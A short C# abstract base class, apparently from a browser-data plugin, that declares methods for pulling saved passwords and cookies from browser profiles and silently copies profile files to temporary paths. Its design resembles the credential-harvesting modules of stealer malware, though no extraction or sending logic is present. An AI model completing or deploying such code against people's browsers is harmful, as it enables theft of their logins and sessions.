using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Browsers
{
    public abstract class BrowserBase
    {
        protected string browserName;
        protected string profilePath;
        
        public abstract List<SavedLogin> GetPasswords();
        public abstract List<Cookie> GetCookies();
        
        protected bool CheckBrowserInstalled()
        {
            return Directory.Exists(profilePath);
        }
        
        protected string GetTempCopyPath(string originalFile)
        {
            string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            try
            {
                if (File.Exists(originalFile))
                {
                    File.Copy(originalFile, tempPath, true);
                    return tempPath;
                }
            }
            catch { }
            return null;
        }
        
        protected void CleanupTempFile(string tempFile)
        {
            try
            {
                if (File.Exists(tempFile))
                    File.Delete(tempFile);
            }
            catch { }
        }
    }
}
